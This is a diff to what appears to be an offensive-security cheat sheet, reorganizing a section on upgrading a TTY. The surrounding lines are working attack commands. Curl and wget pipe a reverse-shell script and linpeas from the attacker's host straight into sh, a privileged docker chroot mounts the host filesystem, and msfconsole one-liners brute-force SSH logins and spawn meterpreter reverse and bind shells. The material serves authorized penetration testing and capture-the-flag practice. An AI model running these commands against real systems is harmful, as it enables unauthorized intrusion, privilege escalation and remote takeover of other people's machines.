@@ -1199,6 +1199,11 @@ python3 /Upload/resh.py $MYIP 5555 /Upload/resh
 curl http://$MYIP:8888/resh | sh
 wget -qO- http://$MYIP:8888/resh | sh
 
++---------- Upgrade TTY ----------+
+script /dev/null -c bash
+python3 -c 'import pty; pty.spawn("/bin/bash")';
+# CTRL-Z; stty size; stty raw -echo; fg; export SHELL=bash; export TERM=xterm-256color; stty rows <num> columns <num>; reset
+
 [*] File Transfer
 curl http://$MYIP:8888/linux/linpeas.sh | sh
 wget -qO- http://$MYIP:8888/linux/linpeas.sh | sh
@@ -1281,17 +1286,6 @@ docker run -it --rm --privileged -v /:/mnt tempimg chroot /mnt sh
 msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/bind_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/bind_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run'
 
 msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/reverse_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run;'
-
-[*] Upgrade TTY
-script /dev/null -c bash
-
-python3 -c 'import pty; pty.spawn("/bin/bash")';
-CTRL-Z
-stty size;stty raw -echo;fg
-export SHELL=bash;
-export TERM=xterm-256color;
-stty rows <num> columns <num>
-reset
 
 [*] Shells
 +---------- One Liners ----------+
